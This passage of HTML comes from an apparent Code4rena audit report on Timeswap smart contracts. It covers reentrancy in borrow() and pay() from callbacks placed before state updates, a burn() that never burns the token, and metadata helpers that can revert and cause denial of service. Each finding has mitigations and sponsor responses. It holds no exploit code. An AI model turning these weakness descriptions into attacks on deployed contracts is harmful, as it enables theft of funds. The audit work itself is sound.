13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h4>\n<p>The callback Callback.lend(asset, xIncrease, data); should be placed at the end of the lend() function after all state updates have taken place.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/5\">Mathepreneur (Timeswap) confirmed and resolved</a>:</strong></p>\n<blockquote>\n<p><a href=\"https://github.com/Timeswap-Labs/Timeswap-V1-Core/pull/106\">https://github.com/Timeswap-Labs/Timeswap-V1-Core/pull/106</a></p>\n</blockquote>\n<h2 id=\"h-06-borrow-function-has-state-updates-after-a-callback-to-msgsender-\" style=\"position:relative;\"><a href=\"#h-06-borrow-function-has-state-updates-after-a-callback-to-msgsender-\" aria-label=\"h 06 borrow function has state updates after a callback to msgsender  permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/6\">[H-06] borrow() function has state updates after a callback to msg.sender </a></h2>\n<p><em>Submitted by jayjonah8</em></p>\n<p>In TimeswapPair.sol, the <code>borrow()</code> function has a callback to the msg.sender in the middle of the function while there are still updates to state that take place after the callback.  The lock modifier guards against reentrancy but not against cross function reentrancy.  Since the protocol implements Uniswap like functionality,  this can be extremely dangerous especially with regard to composability/interacting with other protocols and contracts.  The callback before important state changes (updates to collateral, totalDebtCreated and reserves assets) also violates the Checks Effects Interactions best practices further widening the attack surface.</p>\n<h4 id=\"proof-of-concept-4\" style=\"position:relative;\"><a href=\"#proof-of-concept-4\" aria-label=\"proof of concept 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h4>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L322\">https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L322</a></li>\n<li><a href=\"https://fravoll.github.io/solidity-patterns/checks_effects_interactions.html\">https://fravoll.github.io/solidity-patterns/checks_effects_interactions.html</a></li>\n<li>cross function reentrancy\n<a href=\"https://medium.com/coinmonks/protect-your-solidity-smart-contracts-from-reentrancy-attacks-9972c3af7c21\">https://medium.com/coinmonks/protect-your-solidity-smart-contracts-from-reentrancy-attacks-9972c3af7c21</a></li>\n</ul>\n<h4 id=\"recommended-mitigation-steps-2\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-2\" aria-label=\"recommended mitigation steps 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h4>\n<p>The callback Callback.borrow(collateral, dueOut.collateral, data); should be placed at the end of the borrow() function after all state updates have taken place.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/6\">Mathepreneur (Timeswap) confirmed and resolved</a>:</strong></p>\n<blockquote>\n<p><a href=\"https://github.com/Timeswap-Labs/Timeswap-V1-Core/pull/105\">https://github.com/Timeswap-Labs/Timeswap-V1-Core/pull/105</a></p>\n</blockquote>\n<h2 id=\"h-07-pay-function-has-callback-to-msgsender-before-important-state-updates-\" style=\"position:relative;\"><a href=\"#h-07-pay-function-has-callback-to-msgsender-before-important-state-updates-\" aria-label=\"h 07 pay function has callback to msgsender before important state updates  permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/7\">[H-07] pay() function has callback to msg.sender before important state updates </a></h2>\n<p><em>Submitted by jayjonah8</em></p>\n<p>In TimeswapPair.sol, the <code>pay()</code> function has a callback to the msg.sender in the middle of the function while there are still updates to state that take place after the callback.  The lock modifier guards against reentrancy but not against cross function reentrancy.  Since the protocol implements Uniswap like functionality,  this can be extremely dangerous especially with regard to composability/interacting with other protocols and contracts.  The callback before important state changes (updates to reserves collateral and reserves assets) also violates the Checks Effects Interactions best practices further widening the attack surface.</p>\n<h4 id=\"proof-of-concept-5\" style=\"position:relative;\"><a href=\"#proof-of-concept-5\" aria-label=\"proof of concept 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h4>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L369\">https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L369</a></li>\n<li><a href=\"https://fravoll.github.io/solidity-patterns/checks_effects_interactions.html\">https://fravoll.github.io/solidity-patterns/checks_effects_interactions.html</a></li>\n<li>cross function reentrancy\n<a href=\"https://medium.com/coinmonks/protect-your-solidity-smart-contracts-from-reentrancy-attacks-9972c3af7c21\">https://medium.com/coinmonks/protect-your-solidity-smart-contracts-from-reentrancy-attacks-9972c3af7c21</a></li>\n</ul>\n<h4 id=\"recommended-mitigation-steps-3\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-3\" aria-label=\"recommended mitigation steps 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h4>\n<p>The callback “if (assetIn > 0) Callback.pay(asset, assetIn, data);”  should be placed at the end of the pay() function after all state updates have taken place.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/7\">Mathepreneur (Timeswap) confirmed and resolved</a>:</strong></p>\n<blockquote>\n<p><a href=\"https://github.com/Timeswap-Labs/Timeswap-V1-Core/pull/104\">https://github.com/Timeswap-Labs/Timeswap-V1-Core/pull/104</a></p>\n</blockquote>\n<h1 id=\"medium-risk-findings-10\" style=\"position:relative;\"><a href=\"#medium-risk-findings-10\" aria-label=\"medium risk findings 10 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Medium Risk Findings (10)</h1>\n<h2 id=\"m-01-burn-doesnt-call-erc721-_burn\" style=\"position:relative;\"><a href=\"#m-01-burn-doesnt-call-erc721-_burn\" aria-label=\"m 01 burn doesnt call erc721 _burn permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/111\">[M-01] <code>burn()</code> doesn’t call ERC721 <code>_burn()</code></a></h2>\n<p><em>Submitted by sirhashalot</em></p>\n<p>The CollateralizedDebt.sol contract is a ERC721 token. It has a <code>mint()</code> function, which uses the underlying <code>safeMint()</code> function to create an ERC721 token representing a collateral position. The <code>burn()</code> function in CollateralizedDebt.sol should reverse the actions of <code>mint()</code> by burning the ERC721 token, but the ERC721 <code>_burn()</code> function is never called. This means a user can continue to hold their ERC721 token representing their position after receiving their funds. This is unlike the <code>burn()</code> function found in Bond.sol, Insurance.sol, and Liquidity.sol, which all call the <code>_burn()</code> function (though note the <code>_burn()</code> function in these other Timeswap Convenience contracts is the ERC20 <code>_burn()</code>).</p>\n<h4 id=\"proof-of-concept-6\" style=\"position:relative;\"><a href=\"#proof-of-concept-6\" aria-label=\"proof of concept 6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h4>\n<p>The problematic <code>burn()</code> function is found in CollareralizedDebt.sol\n<a href=\"https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/CollateralizedDebt.sol#L80-L88\">https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/CollateralizedDebt.sol#L80-L88</a></p>\n<p>Compare this function to the <code>burn()</code> functions defined in the other Timeswap Convenience contracts, which contain calls to <code>_burn()</code></p>\n<h4 id=\"recommended-mitigation-steps-4\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-4\" aria-label=\"recommended mitigation steps 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h4>\n<p>Include the following line in the <code>burn()</code> function\n<code>_burn(id);</code></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/111\">Mathepreneur (Timeswap) acknowledged</a>:</strong></p>\n<blockquote>\n<p>If decided not to burn the ERC721 token at all. The burn in this context is burning the debt and collateral locked balance in the ERC721 token.</p>\n</blockquote>\n<h2 id=\"m-02-safedecimals-can-revert-causing-dos\" style=\"position:relative;\"><a href=\"#m-02-safedecimals-can-revert-causing-dos\" aria-label=\"m 02 safedecimals can revert causing dos permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/112\">[M-02] safeDecimals can revert causing DoS</a></h2>\n<p><em>Submitted by sirhashalot</em></p>\n<p>The <code>safeDecimals()</code> function, found in the SafeMetadata.sol contract and called in 3 different Timeswap Convenience contracts, can cause a revert. This is because the safeDecimals function attempts to use abi.decode to return a uint8 when <code>data.length >= 32</code>. However, a data.length value greater than 32 will cause abi.decode to revert.</p>\n<p>A similar issue was found in a previoud code4rena contest: <a href=\"https://github.com/code-423n4/2021-05-nftx-findings/issues/46\">https://github.com/code-423n4/2021-05-nftx-findings/issues/46</a></p>\n<h4 id=\"proof-of-concept-7\" style=\"position:relative;\"><a href=\"#proof-of-concept-7\" aria-label=\"proof of concept 7 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h4>\n<p>The root cause is <a href=\"https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/SafeMetadata.sol#L28\">line 28</a> of the <code>safeDecimals()</code> function in SafeMetadata.sol</p>\n<p>The following link shows the <code>safeDecimals()</code> function in the BoringCrypto library, which might be where this code was borrowed from, uses the strict equality check <code>data.length == 32</code>\n<a href=\"https://github.com/boringcrypto/BoringSolidity/blob/ccb743d4c3363ca37491b87c6c9b24b1f5fa25dc/contracts/libraries/BoringERC20.sol#L54\">https://github.com/boringcrypto/BoringSolidity/blob/ccb743d4c3363ca37491b87c6c9b24b1f5fa25dc/contracts/libraries/BoringERC20.sol#L54</a></p>\n<p><code>safeDecimals()</code> is used in multiple functions such as</p>\n<ul>\n<li>CollateralizedDebt.sol <a href=\"https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/CollateralizedDebt.sol#L50\">line 50</a> and <a href=\"https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/CollateralizedDebt.sol#L54\">line 54</a></li>\n<li>Bond.sol <a href=\"https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/contracts/Bond.sol#L34\">line 34</a></li>\n<li>Insurance.sol <a href=\"https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/Insurance.sol#L36\">line 36</a></li>\n</ul>\n<h4 id=\"recommended-mitigation-steps-5\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-5\" aria-label=\"recommended mitigation steps 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h4>\n<p>Modify the <code>safeDecimals()</code> function to change >= 32 to == 32 like this\n<code>if (success &#x26;&#x26; data.length == 32) return abi.decode(data, (uint8));</code></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/112\">Mathepreneur (Timeswap) confirmed and resolved</a>:</strong></p>\n<blockquote>\n<p><a href=\"https://github.com/Timeswap-Labs/Timeswap-V1-Convenience/pull/61\">https://github.com/Timeswap-Labs/Timeswap-V1-Convenience/pull/61</a></p>\n</blockquote>\n<h2 id=\"m-03-safename-can-revert-causing-dos\" style=\"position:relative;\"><a href=\"#m-03-safename-can-revert-causing-dos\" aria-label=\"m 03 safename can revert causing dos permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/113\">[M-03] <code>safeName()</code> can revert causing DoS</a></h2>\n<p><em>Submitted by sirhashalot</em></p>\n<p>The <code>safeName()</code> function, found in the SafeMetadata.sol contract and called in 4 Timeswap Convenience contracts in the <code>name()</code> functions, can cause a revert. This could make the 4 contracts not compliant with the ERC20 standard for certain asset pairs, because the <code>name()</code> function should return a string and not revert.</p>\n<p>The root cause of the issue is that the <code>safeName()</code> function assumes the return type of any ERC20 token to be a string. If the return value is not a string, abi.decode() will revert, and this will cause the <code>name()</code> functions in the Timeswap ERC20 contracts to revert. There are some tokens that aren’t compliant, such as Sai from Maker, which returns a bytes32 value:\n<a href=\"https://kauri.io/#single/dai-token-guide-for-developers/#token-info\">https://kauri.io/#single/dai-token-guide-for-developers/#token-info</a></p>\n<p>Because this is known to cause issues with tokens that don’t fully follow the ERC20 spec, the <code>safeName()</code> function in the BoringCrypto library has a fix for this. The BoringCrypto <code>safeName()</code> function is similar to the one in Timeswap but it has a <code>returnDataToString()</code> function that handles the case of a bytes32 return value for a token name:\n<a href=\"https://github.com/boringcrypto/BoringSolidity/blob/ccb743d4c3363ca37491b87c6c9b24b1f5fa25dc/contracts/libraries/BoringERC20.sol#L15-L47\">https://github.com/boringcrypto/BoringSolidity/blob/ccb743d4c3363ca37491b87c6c9b24b1f5fa25dc/contracts/libraries/BoringERC20.sol#L15-L47</a></p>\n<h4 id=\"proof-of-concept-8\" style=\"position:relative;\"><a href=\"#proof-of-concept-8\" aria-label=\"proof of concept 8 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h4>\n<p>The root cause is <a href=\"https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/SafeMetadata.sol#L12\">line 12</a> of the <code>safeName()</code> function in SafeMetadata.sol</p>\n<p>The <code>safeName()</code> function is called in:</p>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/Bond.sol#L20-L25\">Bond.sol</a></li>\n<li><a href=\"https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/CollateralizedDebt.sol#L22-L36\">CollateralizedDebt.sol</a></li>\n<li><a href=\"https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/Insurance.sol#L20-L27\">Insurance.sol</a></li>\n<li><a href=\"https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/Liquidity.sol#L22-L29\">Liquidity.sol</a></li>\n</ul>\n<h4 id=\"recommended-mitigation-steps-6\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-6\" aria-label=\"recommended mitigation steps 6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h4>\n<p>Use the BoringCrypto <code>safeName()</code> function code to handle the case of a bytes32 return value:\n<a href=\"https://github.com/boringcrypto/BoringSolidity/blob/ccb743d4c3363ca37491b87c6c9b24b1f5fa25dc/contracts/libraries/BoringERC20.sol#L15-L47\">https://github.com/boringcrypto/BoringSolidity/blob/ccb743d4c3363ca37491b87c6c9b24b1f5fa25dc/contracts/libraries/BoringERC20.sol#L15-L47</a></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/113\">Mathepreneur (Timeswap) confirmed and resolved</a>:</strong></p>\n<blockquote>\n<p><a href=\"https://github.com/Timeswap-Labs/Timeswap-V1-Convenience/pull/60\">https://github.com/Timeswap-Labs/Timeswap-V1-Convenience/pull/60</a></p>\n</blockquote>\n<h2 id=\"m-04-safesymbol-can-revert-causing-dos\" style=\"position:relative;\"><a href=\"#m-04-safesymbol-can-revert-causing-dos\" aria-label=\"m 04 safesymbol can revert causing dos permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/114\">[M-04] <code>safeSymbol()</code> can revert causing DoS</a></h2>\n<p><em>Submitted by sirhashalot</em></p>\n<p>The <code>safeSymbol()</code> function, found in the SafeMetadata.sol contract and called in 4 Timeswap Convenience contracts in the <code>symbol()</code> functions, can cause a revert. This could make the 4 contracts not compliant with the ERC20 standard for certain asset pairs, because the <code>symbol()</code> function should return a string and not revert.</p>\n<p>The root cause of the issue is that the <code>safeSymbol()</code> function assumes the return type of any ERC20 token to be a string. If the return value is not a string, abi.decode() will revert, and this will cause the <code>symbol()</code> functions in the Timeswap ERC20 contracts to revert.</p>\n<p>Because this is known to cause issues with tokens that don’t fully follow the ERC20 spec, the <code>safeSymbol()</code> function in the BoringCrypto library has a fix for this. The BoringCrypto <code>safeSymbol()</code> function is similar to the one in Timeswap but it has a <code>returnDataToString()</code> function that handles the case of a bytes32 return value for a token name:\n<a 